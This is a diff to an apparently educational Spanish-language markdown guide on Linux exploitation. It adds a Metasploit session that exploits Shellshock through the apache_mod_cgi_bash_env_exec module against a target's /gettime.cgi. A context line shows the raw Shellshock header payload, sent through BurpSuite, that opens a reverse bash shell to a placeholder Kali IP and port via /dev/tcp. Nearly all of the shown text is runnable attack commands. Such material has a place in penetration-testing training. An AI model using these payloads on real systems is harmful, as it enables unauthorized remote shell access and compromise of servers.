@@ -57,6 +57,14 @@ Por último, escribimos el comando en `BurpSuite`:
 () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<IP_kali>/<puerto_kali> 0>&1'
 ```
 
+**Usando `msfconsole`**
 
+```bash
+msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhosts <target_ip>
+msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /gettime.cgi
+msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
+```
 
 [⟵ Anterior](../05_sistema.md#explotación-linux)
